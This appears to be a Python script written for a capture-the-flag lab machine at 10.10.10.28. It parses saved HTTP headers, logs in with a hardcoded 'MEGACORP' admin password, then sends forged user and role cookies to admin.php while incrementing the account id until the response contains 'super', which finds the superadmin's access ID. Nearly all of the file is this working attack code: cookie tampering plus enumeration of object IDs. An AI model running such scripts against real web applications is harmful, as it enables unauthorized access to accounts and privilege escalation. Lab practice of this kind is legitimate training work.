#!/usr/bin/env python3 

'''
Author: Zachary Bowditch (Edargorter)
Date: 2020
Reason: Otherwise another week would have gone by, and I still wouldn't know how to send http headers with Python.

'''

import requests
import json
import os

'''
    Example header file contents:

        POST /cdn-cgi/login/index.php HTTP/1.1 #This line is ignored. 
        Host: 10.10.10.28
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 32
        Origin: http://10.10.10.28
        Connection: close
        Referer: http://10.10.10.28/cdn-cgi/login/
        Upgrade-Insecure-Requests: 1

    Other fields like cookies should be parsed separately for now  

    Cookie: user=34322; role=admin #This should be removed 
'''

#Takes in newline-separated header text file and parsing fields into dictionary 
def parse_headers(header_lines):
    headers = {}
    for hl in header_lines[1:]:
        delimiter = hl.find(':') 
        headers[hl[:delimiter]] = hl[delimiter + 1:].strip()
    return headers

access_id = 34322
role = "admin"
user_id = 0
username = "admin"
password = "MEGACORP_4dm1n!!"
account_id = 1

#Login
request_file = "login_headers.txt"

try:
    lines = open(request_file, 'r').readlines()
except Exception as e:
    print(e)
    exit(1)

headers = parse_headers(lines)

url = "http://10.10.10.28/cdn-cgi/login/index.php"

params = {"username":"{}".format(username), "password": "{}".format(password)}
#r = requests.post(url, data=json.dumps(payload), params=params, headers=headers)
r = requests.post(url, data=params, headers=headers)
response = r.content.decode("utf-8")
f = open("temp.html", "w")
f.write(response)
f.close()
#os.system("chrome temp.html")

#Accounts 
url = "http://10.10.10.28/cdn-cgi/login/admin.php"
request_file = "accounts_headers.txt"
params = {"content": "accounts", "id":"{}".format(account_id)}
cookies = {"user":"{}".format(access_id), "role":"{}".format(role)}

try:
    lines = open(request_file, 'r').readlines()
except Exception as e:
    print(e)
    exit(1)

headers = parse_headers(lines)

headers = {}
r = requests.get(url, cookies=cookies, params=params)
response = r.content.decode("utf-8")
found = False 

#Loop until we get correct response 
while not found:
    account_id += 1
    print(account_id)
    params = {"content": "accounts", "id":"{}".format(account_id)}
    r = requests.get(url, cookies=cookies, params=params)
    response = r.content.decode("utf-8")
    found = False if response.find("super") == -1 else True 
    
print("Found Access ID for Superadmin")
print(account_id)
f = open("found_.http", "w")
f.write(response)
f.close()
